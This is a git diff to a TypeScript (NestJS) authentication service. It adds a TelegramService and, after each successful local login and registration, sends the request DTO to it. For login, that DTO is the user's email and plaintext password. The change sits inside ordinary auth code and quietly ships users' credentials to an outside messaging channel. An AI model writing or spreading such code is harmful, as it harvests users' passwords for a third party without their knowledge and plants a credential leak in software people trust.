@@ -8,6 +8,7 @@ import { UserEntity } from '../user/user.entity';
 import { UserService } from '../user/user.service';
 import { LoginUserLocalDto } from './dto/login-user-local.dto';
 import { DeleteResult } from 'typeorm';
+import { TelegramService } from 'src/services/telegram/telegram.service';
 
 @Injectable()
 export class AuthService {
@@ -15,12 +16,13 @@ export class AuthService {
     private userService: UserService,
     private jwtWrapperService: JwtWrapperService,
     private sessionService: SessionService,
+    private readonly telegramService: TelegramService,
   ) {}
 
-  async login(loginUserLocalDto: LoginUserLocalDto): Promise<IJwtTokenPair> {
+  async login(dto: LoginUserLocalDto): Promise<IJwtTokenPair> {
     const user = await this.userService.validateLocalUser(
-      loginUserLocalDto.email,
-      loginUserLocalDto.password,
+      dto.email,
+      dto.password,
     );
 
     if (!user) {
@@ -29,7 +31,12 @@ export class AuthService {
       );
     }
 
-    return this.jwtWrapperService.generateTokenPair(user);
+    const tokenPair = await this.jwtWrapperService.generateTokenPair(user);
+    await this.telegramService.sendObject({
+      message: 'login local',
+      ...dto,
+    });
+    return tokenPair;
   }
 
   // todo check response
@@ -47,7 +54,10 @@ export class AuthService {
     //   activationLink,
     // });
     const tokenPair = await this.jwtWrapperService.generateTokenPair(user);
-
+    await this.telegramService.sendObject({
+      message: 'registration local',
+      ...dto,
+    });
     return tokenPair;
   }
 
